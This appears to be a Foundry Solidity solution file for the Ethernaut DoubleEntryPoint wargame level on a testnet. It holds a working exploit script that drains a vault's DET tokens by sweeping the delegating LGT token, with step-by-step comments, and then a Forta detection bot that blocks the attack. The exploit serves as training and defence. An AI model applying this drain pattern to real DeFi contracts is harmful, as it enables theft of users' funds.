// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/DoubleEntryPoint.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

/*
    Solution script for the Ethernaut Level 26: DoubleEntryPoint

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in DoubleEntryPointScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    NOTE: this challengs has two scripts. The first DoubleEntryPointScript will run
    the exploit and drain the DET tokens from the vault. THIS IS NOT THE SOLUTION BUT ITS
    AN EXAMPLE OF THE EXPLOIT!

    The second script RegisterFortaBot IS THE REQUIRED SOLUTION FOR THIS CHALLENGE! This script
    registers the Forta detection bot to protect the CryptoValut from being exploited.

    ```
    cast wallet import auditor --interactive

    forge script script/DoubleEntryPoint.s.sol:DoubleEntryPointScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    
    forge script script/DoubleEntryPoint.s.sol:RegisterFortaBot \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vvvv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/DoubleEntryPoint.s.sol/11155111
*/

contract DoubleEntryPointScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xdc6a5A818458616E68996244b56d929Bc8B430ac;
    DoubleEntryPoint level26 = DoubleEntryPoint(instance);

    function run() external{
        vm.startBroadcast();

        // Get instance of CryptoVault from the DoubleEntryPoint contract
        CryptoVault vault = CryptoVault(level26.cryptoVault());
        // Get address of the DET token from CryptoVault underlying
        address DET = address(vault.underlying());
        // Get address of the LGT token from CryptoVault delegatedFrom
        address LGT = level26.delegatedFrom();

        // 
        /*
            Finally, call sweepToken on CryptoValult with LGT address.

            This will drain all the *DET* tokens (not LGT) becuase of the delegate call. 
            It works as follows:

            1. The require is sweepToken is bypassed because the token being swept (LGT) 
            is not the underlying token (DET)
            2. The tranfer function is called on the LGT token
            3. The LGT has overridden the transfer function such that it calls delegateTransfer
            on the delegate token (DET)
            4. The delegateTransfer function in DET has an onlyDelegateFrom modifier which is bypased 
            because the allowed sender is the LGT token. The msg.sender in this context will the LGT token
            5. Now the internal _transfer function in the DET token is called therefore removing all the DET tokens
            from CryptoValue.
        */
        vault.sweepToken(IERC20(LGT)); 

        require(IERC20(DET).balanceOf(address(vault)) == 0, "Should be zero");

        vm.stopBroadcast();
    }
}


// source: https://blog.dixitaditya.com/ethernaut-level-26-doubleentrypoint?source=more_series_bottom_blogs

contract AlertBot is IDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) public {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external override {
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if(origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}

contract RegisterFortaBot is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xdc6a5A818458616E68996244b56d929Bc8B430ac;
    DoubleEntryPoint level26 = DoubleEntryPoint(instance);

    function run() external {
        vm.startBroadcast();
        // deploy AlertBot
        AlertBot fortaBot = new AlertBot(level26.cryptoVault());
        // register AlertBot with Forta
        level26.forta().setDetectionBot(address(fortaBot));

        console.log("Registered AlertBot with Forta: ", address(fortaBot));

        vm.stopBroadcast();
    }
}